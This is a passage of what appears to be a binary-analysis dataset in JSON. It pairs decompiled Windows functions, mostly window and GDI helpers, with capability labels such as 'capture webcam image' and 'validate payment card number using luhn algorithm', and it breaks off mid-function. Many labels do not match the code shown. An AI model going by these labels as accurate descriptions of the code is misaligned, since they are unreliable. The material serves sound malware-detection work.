            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00442146(int32_t arg_8h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *in_ECX;\n    int32_t var_40h;\n    int32_t var_3ch;\n    int32_t var_38h;\n    int32_t var_34h;\n    int32_t var_30h;\n    int32_t var_2ch;\n    int32_t var_28h;\n    int32_t var_24h;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetWindowRect)(in_ECX[8], &var_10h);\n    var_30h = var_10h;\n    var_2ch = var_ch;\n    var_28h = var_8h;\n    var_24h = var_4h;\n    (**(*in_ECX + 0x68))(&var_30h, 0);\n    pcVar1 = _sym.imp.USER32.dll_OffsetRect;\n    var_8h = var_8h * 2 - var_28h;\n    var_ch = var_ch * 2 - var_2ch;\n    var_10h = var_10h * 2 - var_30h;\n    var_4h = var_4h * 2 - var_24h;\n    (*_sym.imp.USER32.dll_OffsetRect)(&var_10h, -var_10h, -var_ch);\n    var_18h = in_ECX[0x1a];\n    var_14h = in_ECX[0x1b];\n    var_20h = 0;\n    var_1ch = 0;\n    if (arg_8h != 0) {\n        if (var_8h <= var_18h) {\n            var_18h = var_8h;\n        }\n        if (var_4h <= var_14h) {\n            var_14h = var_4h;\n        }\n    }\n    (**(*in_ECX + 0x68))(&var_20h, 1);\n    (*pcVar1)(&var_20h, -var_20h, -var_1ch);\n    if (arg_8h != 0) {\n        if (var_8h <= in_ECX[0x1a]) {\n            var_18h = var_8h;\n        }\n        if (var_4h <= in_ECX[0x1b]) {\n            var_14h = var_4h;\n        }\n    }\n    iVar2 = fcn.00419143();\n    if (iVar2 == 0) {\n        fcn.00411e42();\n    }\n    (*_sym.imp.USER32.dll_GetWindowRect)(*(iVar2 + 0x20), &var_40h);\n    fcn.0041c2a1(0, 0, 0, (var_38h - var_40h) + (var_18h - var_8h), (var_34h - var_3ch) + (var_14h - var_4h), 0x16);\n    return;\n}\n",
        "token_count": 755
    },
    "00442421": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00442421(int32_t *arg_8h, int32_t *arg_ch)\n\n{\n    uint32_t uVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint lpRect;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    (*_sym.imp.USER32.dll_GetClientRect)(*(in_ECX + 0x20), &lpRect);\n    *arg_8h = var_8h;\n    arg_8h[1] = var_4h;\n    uVar1 = fcn.0041be35();\n    fcn.0044199f(arg_ch);\n    if ((*arg_ch != 0) && ((uVar1 & 0x200000) != 0)) {\n        *arg_8h = *arg_8h + *arg_ch;\n    }\n    if ((arg_ch[1] != 0) && ((uVar1 & 0x100000) != 0)) {\n        arg_8h[1] = arg_8h[1] + arg_ch[1];\n    }\n    if ((*arg_ch < *arg_8h) && (arg_ch[1] < arg_8h[1])) {\n        uVar2 = 1;\n    }\n    else {\n        uVar2 = 0;\n    }\n    return uVar2;\n}\n",
        "token_count": 304
    },
    "0044249c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.0044249c(int32_t arg_8h, int32_t arg_ch, uint32_t *arg_10h, int32_t *arg_14h, int32_t *arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    int32_t in_ECX;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_8h = in_ECX;\n    var_4h = in_ECX;\n    fcn.0044199f(&var_8h);\n    piVar2 = arg_14h;\n    iVar1 = *(in_ECX + 0x6c);\n    *arg_14h = *(in_ECX + 0x68) - arg_8h;\n    arg_14h[1] = iVar1 - arg_ch;\n    piVar3 = fcn.00442078(&arg_8h);\n    *arg_18h = *piVar3;\n    arg_18h[1] = piVar3[1];\n    uVar4 = 0 < *piVar2;\n    if (uVar4 == 0) {\n        *arg_18h = 0;\n    }\n    else if (arg_1ch != 0) {\n        piVar2[1] = piVar2[1] + var_4h;\n    }\n    uVar5 = 0 < piVar2[1];\n    if (uVar5 == 0) {\n        arg_18h[1] = 0;\n    }\n    else {\n        if (arg_1ch != 0) {\n            *piVar2 = *piVar2 + var_8h;\n        }\n        if (uVar4 == 0) {\n            if (*piVar2 < 1) goto code_r0x00442536;\n            uVar4 = 1;\n            piVar2[1] = piVar2[1] + var_4h;\n        }\n    }\n    iVar1 = *piVar2;\n    if ((0 < iVar1) && (iVar1 <= *arg_18h)) {\n        *arg_18h = iVar1;\n    }\ncode_r0x00442536:\n    iVar1 = piVar2[1];\n    if ((0 < iVar1) && (iVar1 <= arg_18h[1])) {\n        arg_18h[1] = iVar1;\n    }\n    *arg_10h = uVar4;\n    arg_10h[1] = uVar5;\n    return;\n}\n",
        "token_count": 597
    },
    "004468b0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode ** __fastcall fcn.004468b0(code **param_1)\n\n{\n    code *pcVar1;\n    \n    fcn.0042210a();\n    *param_1 = vtable.COleIPFrameWnd.0;\n    fcn.00462290(param_1 + 0x36, 0, 0x14);\n    param_1[0x36] = 0x14;\n    pcVar1 = _sym.imp.USER32.dll_SetRectEmpty;\n    param_1[0x35] = NULL;\n    param_1[0x3b] = NULL;\n    param_1[0x3c] = NULL;\n    param_1[0x46] = NULL;\n    (*pcVar1)(param_1 + 0x47);\n    (*pcVar1)(param_1 + 0x4b);\n    param_1[0x4f] = NULL;\n    param_1[0x3f] = NULL;\n    param_1[0x3d] = NULL;\n    param_1[0x3e] = NULL;\n    param_1[0x50] = NULL;\n    param_1[0x51] = NULL;\n    return param_1;\n}\n",
        "token_count": 270
    },
    "00446a03": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "execute .NET assembly via CLR host/2c9ef85a2fe94af39efaaae3fc9e6a8a"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00446a03(uint noname_0, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t *piVar3;\n    int32_t *in_ECX;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    iVar1 = (**(*in_ECX + 0x13c))();\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_CopyRect)(&var_10h, arg_ch);\n        uVar2 = (*_sym.imp.USER32.dll_GetParent)(in_ECX[8]);\n        fcn.004185c5(uVar2);\n        fcn.0042ddc6(&var_10h);\n        fcn.0042dd8a(&var_10h);\n        piVar3 = fcn.0041bccc(0xe900);\n        var_20h = in_ECX[0x47];\n        var_1ch = in_ECX[0x48];\n        var_18h = in_ECX[0x49];\n        var_14h = in_ECX[0x4a];\n        (**(*piVar3 + 0x68))(&var_20h, 1);\n        var_10h = var_10h + (in_ECX[0x47] - var_20h);\n        var_ch = var_ch + (in_ECX[0x48] - var_1ch);\n        var_8h = var_8h + (in_ECX[0x49] - var_18h);\n        var_4h = var_4h + (in_ECX[0x4a] - var_14h);\n        (**(*in_ECX + 400))(&var_10h);\n    }\n    return 0;\n}\n",
        "token_count": 454
    },
    "00446dd1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00446dd1(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int64_t iVar7;\n    int64_t iVar8;\n    int64_t iVar9;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar8 = arg_ch * arg_10h;\n    iVar4 = iVar8 >> 0x20;\n    iVar1 = iVar8;\n    iVar7 = arg_14h * arg_18h;\n    iVar5 = iVar7 >> 0x20;\n    iVar9 = iVar8;\n    if ((iVar4 == 0 || iVar8 < 0) && (iVar8 < 0)) {\n        iVar9 = CONCAT44(-(iVar4 + (iVar1 != 0)), -iVar1);\n    }\n    iVar6 = 0;\n    while (iVar9 != 0) {\n        iVar9 = fcn.00465380();\n        iVar6 = iVar6 + 1;\n    }\n    iVar2 = arg_8h;\n    if (arg_8h < 0) {\n        iVar2 = -arg_8h;\n    }\n    arg_ch = 0;\n    iVar9 = iVar2;\n    while (iVar9 != 0) {\n        iVar9 = fcn.00465380();\n        arg_ch = arg_ch + 1;\n    }\n    iVar6 = iVar6 + arg_ch;\n    if ((iVar5 == 0 || iVar7 < 0) && (iVar7 < 0)) {\n        iVar7 = CONCAT44(-(iVar5 + (iVar7 != 0)), -iVar7);\n        iVar8 = CONCAT44(-(iVar4 + (iVar1 != 0)), -iVar1);\n    }\n    while (0x1f < iVar6) {\n        iVar8 = fcn.00465380();\n        iVar7 = fcn.00465380();\n        iVar1 = iVar6 + -2;\n        if (iVar6 + -1 < 0x20) break;\n        iVar8 = fcn.00465380();\n        iVar7 = fcn.00465380();\n        iVar6 = iVar6 + -3;\n        if (iVar1 < 0x20) break;\n        arg_8h = arg_8h >> 1;\n        iVar7 = fcn.00465380();\n    }\n    iVar8 = fcn.00464420(arg_8h, arg_8h >> 0x1f, iVar8);\n    if (iVar7 == 0) {\n        if ((iVar8 < 0x100000000) && (iVar8 < 0)) {\n            uVar3 = 0x80000000;\n        }\n        else {\n            uVar3 = 0x7fffffff;\n        }\n    }\n    else {\n        iVar9 = fcn.00464ac0(iVar7, 2, 0);\n        uVar3 = fcn.00464ac0(iVar9 + iVar8, iVar7);\n    }\n    return uVar3;\n}\n",
        "token_count": 716
    },
    "0044702c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0044702c(int32_t arg_8h, uint32_t arg_ch, int32_t *arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    uint32_t uVar1;\n    uint32_t extraout_EDX;\n    \n    uVar1 = 0;\n    if (arg_18h == 0) {\n        fcn.00411e42();\n        uVar1 = extraout_EDX;\n    }\n    arg_8h = arg_8h - arg_14h;\n    do {\n        if (arg_ch <= uVar1) {\n            arg_18h = (arg_8h / arg_18h + 1) * arg_18h;\ncode_r0x0044705f:\n            return arg_18h + arg_14h;\n        }\n        if (*arg_10h != arg_8h && arg_8h <= *arg_10h) {\n            arg_18h = *arg_10h;\n            goto code_r0x0044705f;\n        }\n        uVar1 = uVar1 + 1;\n        arg_10h = arg_10h + 1;\n    } while( true );\n}\n",
        "token_count": 274
    },
    "00447c5d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00447c5d(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t nRightRect;\n    int32_t nBottomRect;\n    \n    pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n    nRightRect = param_1;\n    nBottomRect = param_1;\n    iVar2 = (*_sym.imp.GDI32.dll_GetDeviceCaps)(*(param_1 + 8), 10);\n    nRightRect = (*pcVar1)(*(param_1 + 8), 8);\n    nBottomRect = iVar2;\n    fcn.00447987(&nRightRect);\n    (*_sym.imp.GDI32.dll_SetMapMode)(*(param_1 + 4), 1);\n    (*_sym.imp.GDI32.dll_SetWindowOrgEx)(*(param_1 + 4), 0, 0, 0);\n    (*_sym.imp.GDI32.dll_SetViewportOrgEx)(*(param_1 + 4), *(param_1 + 0x20), *(param_1 + 0x24), 0);\n    (*_sym.imp.GDI32.dll_IntersectClipRect)(*(param_1 + 4), 0xffffffff, 0xffffffff, nRightRect + 2, nBottomRect + 2);\n    fcn.00447b61(0);\n    return;\n}\n",
        "token_count": 312
    },
    "004480c7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004480c7(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h, uint arg_28h)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.004653a1(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h, arg_28h);\n    fcn.00401000(uVar1);\n    return;\n}\n",
        "token_count": 143
    },
    "004480f5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004480f5(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    uint uVar1;\n    \n    uVar1 = fcn.004655c2(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch);\n    fcn.00401000(uVar1);\n    return;\n}\n",
        "token_count": 108
    },
    "00448d7a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: lpClassName\n\nvoid fcn.00448d7a(void)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t unaff_EBP;\n    uint var_18h;\n    uint var_14h;\n    uint lpClassName;\n    uint var_4h;\n    \n    fcn.004627af(0xc);\n    fcn.0043026e();\n    fcn.0043039f(1);\n    *(unaff_EBP + -0x14) = 0;\n    fcn.0042961b(unaff_EBP + -0x10, 0x499abc, unaff_EBP + -0x14);\n    *(unaff_EBP + -4) = 0;\n    while (*(*(unaff_EBP + -0x10) + -0xc) != 0) {\n        iVar1 = fcn.0043026e();\n        (*_sym.imp.USER32.dll_UnregisterClassA)(*(unaff_EBP + -0x10), *(iVar1 + 8));\n        uVar2 = fcn.0042961b(unaff_EBP + -0x18, 0x499abc, unaff_EBP + -0x14);\n        *(unaff_EBP + -4) = 1;\n        fcn.0041d369(uVar2);\n        *(unaff_EBP + -4) = 0;\n        fcn.00402740();\n    }\n    fcn.0041372f();\n    fcn.0043040c(1);\n    fcn.00402740();\n    fcn.00462887();\n    return;\n}\n",
        "token_count": 414
    },
    "00448f1a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00448f1a(void)\n\n{\n    int32_t unaff_ESI;\n    \n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(unaff_ESI + 0x10);\n    return;\n}\n",
        "token_count": 50
    },
    "00448f6b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00448f6b(void)\n\n{\n    int32_t unaff_ESI;\n    \n    (*_sym.imp.KERNEL32.dll_LeaveCriticalSection)(unaff_ESI + 0x10);\n    return;\n}\n",
        "token_count": 50
    },
    "00449291": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00449291(int32_t arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t in_ECX;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    \n    fcn.00462290(&var_3ch, 0, 0x3c);\n    var_30h = 0x28;\n    if (arg_8h == 0) {\n        var_3ch = 0;\n    }\n    else {\n        var_3ch = *(arg_8h + 0x20);\n    }\n    var_38h = arg_ch;\n    var_34h = arg_10h;\n    iVar1 = (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x40a, 0, &var_3ch);\n    if (iVar1 != 0) {\n        uVar2 = fcn.0045f3a0(arg_14h, 0x30, &var_30h, 0x28);\n        fcn.00401000(uVar2);\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 290
    },
    "0044930c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044930c(uint *param_1, int32_t param_2, int32_t param_3)\n\n{\n    uint uVar1;\n    uint uVar2;\n    \n    fcn.00462290(param_1, 0, 0x28);\n    *param_1 = 0x28;\n    if (param_2 == 0) {\n        uVar2 = 0;\n    }\n    else {\n        uVar2 = *(param_2 + 0x20);\n    }\n    if (param_3 == 0) {\n        uVar1 = (*_sym.imp.USER32.dll_GetParent)(uVar2);\n        param_1[2] = uVar1;\n        param_1[1] = 1;\n        param_1[3] = uVar2;\n    }\n    else {\n        param_1[1] = 0;\n        param_1[2] = uVar2;\n        param_1[3] = param_3;\n    }\n    return;\n}\n",
        "token_count": 225
    },
    "004499d5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "capture webcam image/8f9bddbfc62a47b78ef3c85708336261"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004499d5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t in_ECX;\n    uint var_40h;\n    int32_t var_1ch;\n    uint var_10h;\n    uint var_ch;\n    uchar uStack12;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    var_10h = arg_8h;\n    fcn.0044930c(&var_40h, arg_ch, arg_10h);\n    var_ch = *0x499cc8;\n    uStack12 = *0x499ccc;\n    var_1ch = fcn.0040f8a0(0x405);\n    fcn.00462290(var_1ch, 0, 0x400);\n    uVar1 = fcn.0045f3a0(var_1ch + 0x400, 5, &var_ch, 5);\n    fcn.00401000(uVar1);\n    (*_sym.imp.USER32.dll_SendMessageA)(*(in_ECX + 0x20), 0x40b, 0, &var_40h);\n    iVar2 = fcn.00460c0e(&var_ch, var_1ch + 0x400, 5);\n    if (iVar2 != 0) {\n        fcn.00411e0e();\n    }\n    uVar1 = 0xffffffff;\n    fcn.00414de4();\n    fcn.0045e747(uVar1);\n    return;\n}\n",
        "token_count": 375
    },
    "00449eda": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00449eda(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint uStack48;\n    uchar auStack28 [28];\n    \n    pcVar1 = _sym.imp.USER32.dll_PeekMessageA;\n    while( true ) {\n        uStack48 = 0;\n        iVar2 = (*pcVar1)(&stack0xffffffe4, 0, 0xf, 0xf);\n        if (iVar2 == 0) {\n            *(param_1 + 0x70) = *(*(param_1 + 0x68) + 0x84);\n            *(param_1 + 0x78) = *(*(param_1 + 0x68) + 0x80) & 0xf000;\n            (*_sym.imp.USER32.dll_SetRectEmpty)(param_1 + 0xc);\n            *(param_1 + 0x20) = 0;\n            *(param_1 + 0x1c) = 0;\n            *(param_1 + 0x24) = 0;\n            *(param_1 + 0x7c) = 0;\n            *(param_1 + 0x80) = 0;\n            uVar3 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n            iVar2 = fcn.004185c5(uVar3);\n            iVar4 = (*_sym.imp.USER32.dll_LockWindowUpdate)(*(iVar2 + 0x20));\n            if (iVar4 == 0) {\n                uVar3 = 3;\n            }\n            else {\n                uVar3 = 0x403;\n            }\n            uVar3 = (*_sym.imp.USER32.dll_GetDCEx)(*(iVar2 + 0x20), 0, uVar3);\n            uVar3 = fcn.0042e163(uVar3);\n            *(param_1 + 0x84) = uVar3;\n            return;\n        }\n        iVar2 = (*_sym.imp.USER32.dll_GetMessageA)(&stack0xffffffd0, 0, 0xf, 0xf);\n        if (iVar2 == 0) break;\n        uStack48 = 0x449f12;\n        (*_sym.imp.USER32.dll_DispatchMessageA)();\n    }\n    return;\n}\n",
        "token_count": 524
    },
    "0044a31c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0044a31c(int32_t param_1)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    \n    fcn.00449f99(1);\n    (*_sym.imp.USER32.dll_ReleaseCapture)();\n    uVar2 = (*_sym.imp.USER32.dll_GetDesktopWindow)();\n    iVar3 = fcn.004185c5(uVar2);\n    (*_sym.imp.USER32.dll_LockWindowUpdate)(0);\n    iVar1 = *(param_1 + 0x84);\n    if (iVar1 != 0) {\n        (*_sym.imp.USER32.dll_ReleaseDC)(*(iVar3 + 0x20), *(iVar1 + 4));\n        *(param_1 + 0x84) = 0;\n    }\n    return;\n}\n",
        "token_count": 181
    },
    "0044bb75": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044bb75(int32_t arg_8h, int32_t arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t in_ECX;\n    int32_t iVar4;\n    \n    iVar1 = arg_8h;\n    iVar4 = 0;\n    if (-1 < arg_8h) goto code_r0x0044bb8b;\n    do {\n        fcn.00411e42();\ncode_r0x0044bb8b:\n        if (iVar4 <= arg_ch) {\n            *(in_ECX + 0x10) = arg_ch;\n        }\n        if (iVar1 == iVar4) {\n            fcn.004115a4(*(in_ECX + 4));\n            *(in_ECX + 0xc) = iVar4;\n            *(in_ECX + 8) = iVar4;\n            goto code_r0x0044bc8f;\n        }\n        if (*(in_ECX + 4) == iVar4) {\n            uVar2 = fcn.00411579(iVar1 << 2);\n            *(in_ECX + 4) = uVar2;\n            fcn.00462290(uVar2, 0, iVar1 << 2);\n            *(in_ECX + 0xc) = iVar1;\ncode_r0x0044bbf7:\n            *(in_ECX + 8) = iVar1;\n            return;\n        }\n        iVar4 = *(in_ECX + 0xc);\n        if (iVar1 <= iVar4) {\n            iVar4 = *(in_ECX + 8);\n            if (iVar4 < iVar1) {\n                fcn.00462290(*(in_ECX + 4) + iVar4 * 4, 0, (iVar1 - iVar4) * 4);\n            }\n            goto code_r0x0044bbf7;\n        }\n        iVar3 = *(in_ECX + 0x10);\n        if (iVar3 == 0) {\n            iVar3 = *(in_ECX + 8) + (*(in_ECX + 8) >> 0x1f & 7U) >> 3;\n            if (iVar3 < 4) {\ncode_r0x0044bc29:\n                iVar3 = 4;\n            }\n            else if (iVar3 < 0x401) {\n                if (iVar3 < 4) goto code_r0x0044bc29;\n            }\n            else {\n                iVar3 = 0x400;\n            }\n        }\n        arg_8h = iVar3 + iVar4;\n        if (iVar3 + iVar4 <= iVar1) {\n            arg_8h = iVar1;\n        }\n    } while (arg_8h < iVar4);\n    iVar4 = fcn.00411579(arg_8h << 2);\n    fcn.0041314e(iVar4, arg_8h << 2, *(in_ECX + 4), *(in_ECX + 8) << 2);\n    fcn.00462290(iVar4 + *(in_ECX + 8) * 4, 0, (iVar1 - *(in_ECX + 8)) * 4);\n    fcn.004115a4(*(in_ECX + 4));\n    *(in_ECX + 8) = iVar1;\n    *(in_ECX + 0xc) = arg_8h;\ncode_r0x0044bc8f:\n    *(in_ECX + 4) = iVar4;\n    return;\n}\n",
        "token_count": 779
    },
    "0044bd84": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0044bd84(int32_t arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t in_ECX;\n    \n    if ((-1 < arg_8h) && (0 < arg_10h)) {\n        if (arg_8h < *(in_ECX + 8)) {\n            iVar1 = *(in_ECX + 8);\n            fcn.0044bb75(iVar1 + arg_10h, 0xffffffff);\n            fcn.00429a2a(*(in_ECX + 4) + (arg_8h + arg_10h) * 4, ((*(in_ECX + 8) - arg_8h) - arg_10h) * 4, \n                         *(in_ECX + 4) + arg_8h * 4, (iVar1 - arg_8h) * 4);\n            fcn.00462290(*(in_ECX + 4) + arg_8h * 4, 0, arg_10h << 2);\n        }\n        else {\n            fcn.0044bb75(arg_8h + arg_10h, 0xffffffff);\n        }\n        arg_8h = arg_8h << 2;\n        do {\n            arg_10h = arg_10h + -1;\n            *(arg_8h + *(in_ECX + 4)) = arg_ch;\n            arg_8h = arg_8h + 4;\n        } while (arg_10h != 0);\n        return;\n    }\n    fcn.00411e42();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 390
    },
    "0044be28": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0044be28(int32_t param_1, int32_t param_2, int32_t param_3)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    \n    iVar1 = param_2 + param_3;\n    if ((((-1 < param_2) && (-1 < param_3)) && (iVar1 <= *(param_1 + 8))) && ((param_2 <= iVar1 && (param_3 <= iVar1))))\n    {\n        iVar3 = *(param_1 + 8) - iVar1;\n        if (iVar3 != 0) {\n            iVar3 = iVar3 * 4;\n            fcn.00429a2a(*(param_1 + 4) + param_2 * 4, iVar3, *(param_1 + 4) + iVar1 * 4, iVar3);\n        }\n        *(param_1 + 8) = *(param_1 + 8) - param_3;\n        return;\n    }\n    fcn.00411e42();\n    pcVar2 = swi(3);\n    (*pcVar2)();\n    return;\n}\n",
        "token_count": 259
    },
    "0044c817": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.0044c817(int32_t param_1, uint param_2, uint param_3)\n\n{\n    fcn.004634fc(param_2, param_3, \"Embedding %lu\", *(param_1 + 0x2c));\n    return;\n}\n",
        "token_count": 66
    },
    "0044db73": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044db73(void)\n\n{\n    code **extraout_ECX;\n    uint *in_FS_OFFSET;\n    uint uStackY532;\n    uint in_stack_fffffe04;\n    \n    fcn.004627e2();\n    *extraout_ECX = vtable.COleClientItem.0;\n    fcn.0044c767(1);\n    if (extraout_ECX[8] != NULL) {\n        uStackY532 = 0x44dbc1;\n        (**(*extraout_ECX[8] + 0xc0))(extraout_ECX);\n    }\n    fcn.00431c50();\n    fcn.00432f21();\n    fcn.00450fd0(0xffffffff);\n    *in_FS_OFFSET = uStackY532;\n    fcn.0045e747(in_stack_fffffe04);\n    return;\n}\n",
        "token_count": 190
    },
    "0044deaf": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0044deaf(void)\n\n{\n    int32_t iVar1;\n    uint *arg_8h;\n    uint var_14h;\n    uint32_t var_4h;\n    \n    var_4h = *0x4b8030 ^ &stack0xfffffffc;\n    arg_8h = &var_14h;\n    fcn.0044c9c3();\n    iVar1 = fcn.00460c0e(&var_14h, 0x49f9b8, 0x10);\n    if (iVar1 != 0) {\n        fcn.0044dcb2(&var_14h);\n    }\n    fcn.0045e747(arg_8h);\n    return;\n}\n",
        "token_count": 163
    },
    "0044e6a5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_1ch\n// WARNING: Variable defined which should be unmapped: var_18h\n// WARNING: Variable defined which should be unmapped: var_14h\n// WARNING: Variable defined which should be unmapped: var_10h\n\nvoid __cdecl fcn.0044e6a5(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_4h;\n    \n    fcn.004627af(0x10);\n    puVar1 = *(unaff_EBP + 8);\n    if (puVar1 == NULL) {\n        *(unaff_EBP + -0x14) = 0;\n        *(unaff_EBP + -0x10) = 0;\n    }\n    else {\n        uVar2 = *puVar1;\n        *(unaff_EBP + -0x10) = puVar1[1];\n        *(unaff_EBP + -0x14) = uVar2;\n        fcn.00438bcf(unaff_EBP + -0x14);\n    }\n    puVar1 = *(unaff_EBP + 0xc);\n    if (puVar1 == NULL) {\n        *(unaff_EBP + -0x1c) = 0;\n        *(unaff_EBP + -0x18) = 0;\n    }\n    else {\n        uVar2 = *puVar1;\n        *(unaff_EBP + -0x18) = puVar1[1];\n        *(unaff_EBP + -0x1c) = uVar2;\n        fcn.00438bcf(unaff_EBP + -0x1c);\n    }\n    iVar3 = *(extraout_ECX + 0x20);\n    (*_sym.imp.KERNEL32.dll_InterlockedIncrement)(extraout_ECX + 4);\n    